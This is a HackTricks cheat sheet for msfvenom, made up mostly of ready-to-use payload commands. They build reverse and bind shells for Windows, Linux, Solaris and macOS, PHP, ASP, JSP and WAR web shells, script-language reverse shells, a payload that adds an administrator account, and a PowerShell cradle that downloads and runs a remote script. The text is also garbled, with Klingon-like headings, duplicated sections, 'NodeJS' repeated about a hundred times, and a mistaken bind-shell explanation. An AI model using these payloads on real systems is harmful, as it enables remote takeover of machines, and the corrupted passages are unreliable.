# MSFVenom - CheatSheet

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks AWS Red Team Expert</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

***

## Basic msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

One can also use the `-a` to specify the architecture or the `--platform`

## Listing
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## tlhIngan Hol

## QaStaHvIS 'e' vItlhutlh

### -p, --payload
#### -p, --payload
#### -p, --payload

The `-p` parameter specifies the payload to be used when creating the shellcode.

### -f, --format
#### -f, --format
#### -f, --format

The `-f` parameter specifies the output format of the shellcode.

### -e, --encoder
#### -e, --encoder
#### -e, --encoder

The `-e` parameter specifies the encoder to be used for the shellcode.

### -b, --bad-chars
#### -b, --bad-chars
#### -b, --bad-chars

The `-b` parameter specifies any bad characters that should be avoided in the shellcode.

### -i, --iterations
#### -i, --iterations
#### -i, --iterations

The `-i` parameter specifies the number of iterations to be used for encoding the shellcode.

### -a, --arch
#### -a, --arch
#### -a, --arch

The `-a` parameter specifies the architecture for which the shellcode is being created.

### -s, --space
#### -s, --space
#### -s, --space

The `-s` parameter specifies the maximum size of the shellcode.

### -n, --nopsled
#### -n, --nopsled
#### -n, --nopsled

The `-n` parameter specifies the size of the NOP sled to be used in the shellcode.

### -v, --var-name
#### -v, --var-name
#### -v, --var-name

The `-v` parameter specifies the variable name to be used for the shellcode.

### -x, --template
#### -x, --template
#### -x, --template

The `-x` parameter specifies the template file to be used for the shellcode.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **Reverse Shell**

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell

{% code overflow="wrap" %}### Bind Shell

Bind Shell is a technique used in hacking to create a shell on a target system that listens for incoming connections. This allows the attacker to gain remote access to the target system and execute commands.

To create a bind shell using msfvenom, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: The payload to use for the bind shell. This can be any payload supported by msfvenom.
- `<attacker IP>`: The IP address of the attacker machine.
- `<attacker port>`: The port on the attacker machine to listen for incoming connections.
- `<format>`: The format of the output file. This can be any format supported by msfvenom, such as exe, elf, or raw.
- `<output file>`: The name of the output file to save the generated shell.

Once the bind shell is created, you can transfer it to the target system and execute it. When the shell is executed, it will start listening for incoming connections on the specified IP address and port. The attacker can then connect to the shell and gain remote access to the target system.

It is important to note that using bind shells can be risky, as they expose the target system to potential attacks. Therefore, it is recommended to use bind shells only in controlled environments and with proper authorization.
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### lo'la' User

{% code overflow="wrap" %}
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell

{% code overflow="wrap" %}### CMD Shell

CMD Shell- 'CMD Shell' is a Windows command-line interpreter that allows you to interact with the operating system through a command prompt. It is commonly used for executing commands, running scripts, and performing various administrative tasks on a Windows system.

To generate a payload using msfvenom for a CMD shell, you can use the following command:

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
```

This command will generate an executable file named 'shell.exe' that will establish a reverse TCP connection to the specified IP address and port. Replace `<attacker IP>` with your IP address and `<attacker port>` with the port you want to use for the connection.

Once you have generated the payload, you can transfer it to the target system and execute it to establish a reverse shell connection.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **QapHa'**

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder

{% code overflow="wrap" %}### Encoder

{% code overflow="wrap" %}### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### qarDaSqa' executable Daq

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
{% endcode %}

## Linux Payloads

### Reverse Shell

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell

{% code overflow="wrap" %}### Bind Shell

Bind Shell is a technique used in hacking to create a shell on a target system that listens for incoming connections. This allows the attacker to gain remote access to the target system and execute commands.

To create a bind shell using msfvenom, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
```

- `<payload>`: The payload to use for the bind shell. This can be any payload supported by msfvenom.
- `<attacker IP>`: The IP address of the attacker machine.
- `<attacker port>`: The port on the attacker machine to listen for incoming connections.
- `<format>`: The format of the output file. This can be any format supported by msfvenom, such as exe, elf, or raw.
- `<output file>`: The name of the output file to save the generated shell.

Once the bind shell is created, you can transfer it to the target system and execute it. When the shell is executed, it will start listening for incoming connections on the specified IP address and port. The attacker can then connect to the shell and gain remote access to the target system.

It is important to note that using bind shells can be risky, as they expose the target system to potential attacks. Therefore, it is recommended to use bind shells only in controlled environments and with proper authorization.
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

{% code overflow="wrap" %}### SunOS (Solaris)

{% code overflow="wrap" %}
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
{% endcode %}

## **MAC Payloads**

### **Reverse Shell:**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**

{% code overflow="wrap" %}### **Bind Shell**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
{% endcode %}

## **Web Based Payloads**

### **PHP**

#### Reverse shel**l**

{% code overflow="wrap" %}
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
{% endcode %}

### ASP/x

#### Reverse shell

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
{% endcode %}

### JSP

#### Reverse shell

{% code overflow="wrap" %}JSP

#### Reverse shell

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
{% endcode %}

### WAR

#### Reverse Shell

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
{% code %}

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS

### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Script Language payloads**

### **Perl**

{% code overflow="wrap" %}## **Script Language payloads**

### **Perl**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
{% endcode %}

### **Python**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
{% endcode %}

### **Bash**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
